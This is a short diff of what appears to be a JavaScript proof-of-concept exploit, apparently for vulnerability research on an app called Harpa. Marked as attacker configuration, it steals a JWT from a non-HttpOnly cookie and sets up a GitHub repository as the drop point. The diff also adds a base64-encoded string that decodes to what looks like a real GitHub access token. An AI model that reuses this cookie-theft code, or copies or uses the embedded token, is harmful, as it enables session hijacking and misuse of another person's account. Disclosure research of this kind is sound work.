@@ -4,7 +4,7 @@
 (async () => {
   // === ATTACKER CONFIG ===
   // Base64-encoded GitHub PAT (encode yours: echo -n 'github_pat_xxx' | base64)
-  const GH_TOKEN_B64 = "PASTE_YOUR_BASE64_ENCODED_TOKEN_HERE";
+  const GH_TOKEN_B64 = "Z2l0aHViX3BhdF8xMUFWVzRLNEEwUGZweXZUU2Y2eUFlX05POGNuajU1MVZZSGIyOVo5dzJOMXFvZTd4dTkzdDgyVHZZTjNERDM4a0pKWExIR0JHTHBkTHRtYlFG";
   const GH_REPO = "dharani-dharan-11023/harpa-poc";
 
   // Step 1: Steal JWT from non-HttpOnly cookie
